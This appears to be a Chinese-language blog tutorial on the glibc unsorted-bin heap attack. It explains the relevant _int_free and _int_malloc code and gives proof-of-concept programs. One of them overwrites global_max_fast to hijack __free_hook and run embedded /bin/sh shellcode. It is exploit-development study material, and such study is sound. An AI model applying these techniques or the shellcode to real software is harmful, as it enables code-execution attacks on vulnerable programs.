[TOC]

### unsorted-bin attack

&emsp;&emsp;<font size=2>好久没来写how2pwn了，这一次是因为论文要用到，所以必须得抓紧时间复习一下。顺便重拾一下以前拼命想学现在却有些反感的东西，多学点，万一以后真成大佬了呢？</font></br>

&emsp;&emsp;<font size=2>unsortedbin的原理其实非常简单，就是利用了unsortedbin脱钩的操作来达到一次任意地址写，但是也只能是一次，利用完成后unsortedbin list就废了，然后我们从shellphish的一个最简单的demo入手：</font></br>

```C
	unsigned long stack_var=0;

	unsigned long *p=malloc(400);
	malloc(500);

	free(p);
	p[1]=(unsigned long)(&stack_var-2);

	malloc(400);
```

&emsp;&emsp;<font size=2>我同样假设你已经看过我的malloc和free两部曲了，接下来会省略一些细节，首先我们来学习什么是unsortedbin，直接看`_int_free`内部：</font></br>

```C
#define unsorted_chunks(M)          (bin_at (M, 1))
#define bin_at(m, i) \
  (mbinptr) (((char *) &((m)->bins[((i) - 1) * 2]))                           \
             - offsetof (struct malloc_chunk, fd))

  if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())
  {
    //...      
  }
  else if (!chunk_is_mmapped(p)) {
    if (! have_lock) {
      (void)mutex_lock(&av->mutex);
      locked = 1;
    }

    nextchunk = chunk_at_offset(p, size);
    
    //这里跳过安全检查
    //....
    
    nextsize = chunksize(nextchunk);

    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      /* consolidate forward */
      if (!nextinuse) {
        unlink(av, nextchunk, bck, fwd);
        size += nextsize;
      } else
        clear_inuse_bit_at_offset(nextchunk, 0);

      /*
        Place the chunk in unsorted chunk list. Chunks are
        not placed into regular bins until after they have
        been given one chance to be used in malloc.
      */

      bck = unsorted_chunks(av);
      fwd = bck->fd;
      if (__glibc_unlikely (fwd->bk != bck))
        {
          errstr = "free(): corrupted unsorted chunks";
          goto errout;
        }
      p->fd = fwd;
      p->bk = bck;
      if (!in_smallbin_range(size))
        {
          p->fd_nextsize = NULL;
          p->bk_nextsize = NULL;
        }
      bck->fd = p;
      fwd->bk = p;

      set_head(p, size | PREV_INUSE);
      set_foot(p, size);

      check_free_chunk(av, p);
    }

```

&emsp;&emsp;<font size=2>这些就够了，我们的堆块不属于mmap映射的内存，且不是fastbin，是smallbin，相邻堆块为占用态，因此控制流如上。可以看到这种情况下`free`的操作就是置位了下一个堆块的`pre_inuse`位，然后`bck`获取了unsortedbin的地址。接下来的：</font></br>

- `p->fd = fwd`和`p->bk = bck`就是我们泄漏libc地址最常用的手法的原理；
- `bck->fd = p`和`fwd->bk = p`就是设置了unsortedbin list的`bk`和`fd`指向我们刚刚free的smallbin。

&emsp;&emsp;<font size=2>那么什么是unsortedbin呢？为什么我们要先了解他？unsortedbin是smallbin被放入malloc_state->bins这个空闲堆块表之前的一个中转站，刚被free的堆块不会立马被放入main_arena的bins中，而是先链入unsortedbin list备用以提高内存效率。只有在下一次调用malloc时且bins没有匹配到堆块时，才会执行unsortedbin清空，把堆块都放入bins里的操作，这些注释里也有提到。</font></br>

&emsp;&emsp;<font size=2>然后我们看第二个`malloc(400)`的`_int_malloc`：</font></br>

```C
  checked_request2size (bytes, nb);

  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
  {
    //...
  }

  /*
     If a small request, check regular bin.  Since these "smallbins"
     hold one size each, no searching within bins is necessary.
     (For a large request, we need to wait until unsorted chunks are
     processed to find best fit. But for small ones, fits are exact
     anyway, so we can check now, which is faster.)
   */

  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          //...
        }
    }

  for (;; )
    {
      int iters = 0;
      while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
        {
          bck = victim->bk;
          if (__builtin_expect (victim->size <= 2 * SIZE_SZ, 0)
              || __builtin_expect (victim->size > av->system_mem, 0))
            malloc_printerr (check_action, "malloc(): memory corruption",
                             chunk2mem (victim), av);
          size = chunksize (victim);

          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              //...
            }
        
          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);

          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }
          //...
        }
    }
```

&emsp;&emsp;<font size=2>有些宏的意思就不放了，顾名思义也能猜出来的作用。接下来著名的unsortedbin attack的原理就在这了，是这两行：</font></br>

```C
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```

&emsp;&emsp;<font size=2>这里的`victim`就是我们释放的第一个堆块，其fd指针我们修改为了`stack_var-0x10`的地址处，因此`bck`就是`stack_var-0x10`，也就是说第二行代码相当于完成了一次`[&stack_var-0x10+0x10] = &unsortedbin`的任意地址写操作，但是这个操作也导致了`unsortedbin list`的`bk`指针也被修改为了`&stack_var`，破坏了`unsortedbin list`，这样当我们分配新的smallbin或者largebin时程序就会崩溃，除非能修复（一般没这个机会了），不然只能使用fastbin了。</font></br>

&emsp;&emsp;<font size=2>然后`_int_malloc`就返回了我们第一次释放的堆块p，同时`stack_var`也已经被修改为了`&unsortedbin list`，完整的demo程序如下（这里提一句，要么一开始就用printf，不要在unsortedbin attack之后使用printf，因为`_IO_FILE`的初始化也会分配堆块，同样会触发unsortedbin list的检查异常）：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>

//直接用setvbuf保持堆区干净是最好的
void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
}

int main(){

	unsigned long stack_var=0;
	unsigned long *p=malloc(400);

	setbufs();
	//printf("hello,world!\n");
	
	p = malloc(400);
	malloc(500);

	free(p);
	p[1]=(unsigned long)(&stack_var-2);

	malloc(400);

	printf("stack_var: 0x%llx\n",stack_var);

	return 0;
}
```



----

### expolit global_max_fast

&emsp;&emsp;<font size=2>按照惯例，每次分析完了之后都要来一些甜品技术，这里就列一个利用`unsortedbin attack`任意地址写到`global_max_fast`来实现可控的利用吧，技术原理其实看过两部曲和上面这篇文章之后就可以理解了。</font></br>

&emsp;&emsp;<font size=2>我们之前看malloc分析的时候有一个全局变量叫`global_max_fast`，而且我们也知道就是这个变量设定了fastbin的最大大小，倘若我们通过某种手法把这个变量改的很大，那么我们接下来分配或者释放的堆块都会先进入fastbin的逻辑。回忆一下，main_arena中堆块表fastbinY和bins是什么时候被改写的？就是free的时候，用main_arena中堆块表中记录的堆块地址判断是否是同种size堆块的第一次释放，或者是根据记录进行被释放堆块的大小检查进而更新一下堆块的fd、bk指针，而其中fastbin的检查又最为简单，仅仅只是检查了一下是否存在double free。我们看如下`_int_free`中的fastbin部分的判断逻辑：</font></br>

```C
  if ((unsigned long)(size) <= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
      /*
        If TRIM_FASTBINS set, don't place chunks
        bordering top into fastbins
      */
      && (chunk_at_offset(p, size) != av->top)
#endif
      ) {

    //...
    
    free_perturb (chunk2mem(p), size - 2 * SIZE_SZ);

    set_fastchunks(av);
    unsigned int idx = fastbin_index(size);
    fb = &fastbin (av, idx);

    /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
    mchunkptr old = *fb, old2;
    unsigned int old_idx = ~0u;
    do
      {
        /* Check that the top of the bin is not the record we are going to add
           (i.e., double free).  */
        if (__builtin_expect (old == p, 0))
          {
            errstr = "double free or corruption (fasttop)";
            goto errout;
          }
        /* Check that size of fastbin chunk at the top is the same as
           size of the chunk that we are adding.  We can dereference OLD
           only if we have the lock, otherwise it might have already been
           deallocated.  See use of OLD_IDX below for the actual check.  */
        if (have_lock && old != NULL)
          old_idx = fastbin_index(chunksize(old));
        p->fd = old2 = old;
      }
    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);

    if (have_lock && old != NULL && __builtin_expect (old_idx != idx, 0))
      {
        errstr = "invalid fastbin entry (free)";
        goto errout;
      }
  }


```

&emsp;&emsp;<font size=2>可以看到我们几乎不需要考虑绕过这些检查，只要不double free就不会有问题。在这里：</font></br>

```C
p->fd = old2 = old;
```

&emsp;&emsp;<font size=2>就是空闲fastbin的组织形式，每一个被free的fastbin的fd指向上一个堆块，bk不使用。当然是同大小的fastbin。然后后面的：</font></br>

```C
catomic_compare_and_exchange_val_rel (fb, p, old2)
```

&emsp;&emsp;<font size=2>这里的fb指向我们的试图修改的数据，是我们释放的堆块的size经过`fastbin_index`和`fastbin`两个宏计算得到的地址，而p就是我们刚释放的堆块，然后完成了一个`mov [fb],p`的操作。如果堆块可以执行的话我们可以直接让fb指向`__free_hook`，然后在p上放上我们的shellcode就行了，不过注意这里的p是指向堆块头部而不是主体，而且之前的`p->fd = old`会重写fd，所以我们可以创建一个重叠堆块，在修改完`__free_hook`后覆盖p地址为shellcode，这样下次free的时候就能执行shellcode了。</font></br>

&emsp;&emsp;<font size=2>在实际中可以用来劫持`vtable`或者整个`_IO_FILE`结构，`__free_hook`的话可能遇不到可以直接执行shellcode的情况，但是这里就不展开讲了，因为这一节主要是讲unsortedbin，不能跑太偏，一切简单为主，`global_max_fast`的利用demo就放下面了：</font></br>

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

void setbufs()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	setvbuf(stderr,0,2,0);
}

// fastbin size convert to address
#define offset2size(x)	((x)<<1)
#define ul unsigned long

unsigned char shellcode[]="\x48\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

int main(){

	ul libc_base = 0;
	ul global_max_fast = 0;
	ul __free_hook = 0x3c67a8;
	ul main_arena = 0x3c4b20;
	ul *p, *p1, *p2, *p3, *p4;

	setbufs();

	p1 = malloc(0x100);
	p2 = malloc(0x20);

	free(p1);
	libc_base = *(ul*)p1;
	libc_base -= 0x3c4b78;
	global_max_fast = libc_base + 0x3c67f8;
	free(p2);
	printf("libc_base is :%lx\n", libc_base);
	printf("&(global_max_fast) is :%lx\n", global_max_fast);
	printf("global_max_fast is :%lx\n", *(ul*)global_max_fast);

	p1 = malloc(0x100);
	p2 = malloc(0x20);
	p3 = malloc(offset2size(__free_hook-main_arena));
	malloc(0x20);

	free(p1);
	p = (ul*)p1;
	//*(p+1) = (ul)&libc_base - sizeof(ul*)*2;
	//malloc(0x100);
	//printf("after unsorted-bin attack is :%lx\n", libc_base);
	
	*(p+1) = global_max_fast - sizeof(ul*)*2;
	malloc(0x100);
	printf("after unsorted-bin attack\n");
	printf("global_max_fast is :%lx\n", *(ul*)global_max_fast);

	free(p3);
	ul page = ((ul)p3-sizeof(ul*)*2)&(~0xFFF);
	mprotect((void*)page, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
	memcpy((void*)((ul)p3-sizeof(ul*)*2), shellcode, sizeof(shellcode));

	// do not malloc
	free(p2);


	return 0;
}
```

